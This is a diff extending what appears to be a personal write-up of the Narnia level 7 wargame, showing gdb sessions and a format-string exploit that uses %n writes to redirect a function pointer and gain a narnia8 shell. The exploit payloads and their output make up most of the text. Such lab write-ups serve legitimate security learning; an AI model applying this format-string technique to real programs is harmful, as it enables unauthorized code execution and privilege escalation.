@@ -350,4 +350,40 @@ Breakpoint 1, 0x08048685 in vuln ()
 0xffffd640:	"\002"
 0xffffd642:	""
 
+After a bit more fiddling I found how the format string can be used
 
+(gdb) r $(python -c'print "\x3c\xd6\xff\xff"+"JUNK"+"\x3d\xd6\xff\xff"+"JUNK"+"\x3e\xd6\xff\xff"+"JUNK"+"\x3f\xd6\xff\xff"+"JUNK"+"%x%x%x%x%x%n%x%n%x%n%x%n"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia7 $(python -c'print "\x3c\xd6\xff\xff"+"JUNK"+"\x3d\xd6\xff\xff"+"JUNK"+"\x3e\xd6\xff\xff"+"JUNK"+"\x3f\xd6\xff\xff"+"JUNK"+"%x%x%x%x%x%n%x%n%x%n%x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd63c)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x574f473f in ?? ()
+(gdb) 
+
+Now I got to get the decimal numbers of blank spaces before each %n right so that we can get the proper return address. 
+Since the number of blank spaces can only be increased, we gotta play around with overflows. 
+This means the right now the least significant byte is 3f, which is greater than 06, so we write at least 0106 to least sig and then 
+overwrite the higher order byte 01 with the next %n
+
+narnia7@narnia:~$ /narnia/narnia7 $(python -c'print "\x4c\xd6\xff\xff"+"JUNK"+"\x4d\xd6\xff\xff"+"JUNK"+"\x4e\xd6\xff\xff"+"JUNK"+"\x4f\xd6\xff\xff"+"JUNK"+"%x%x%x%x%206x%n%129x%n%125x%n%260x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd64c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ 
+
+With this solution I solved with 720 blank spaces, which is way less than the previous 134514402. Neat!
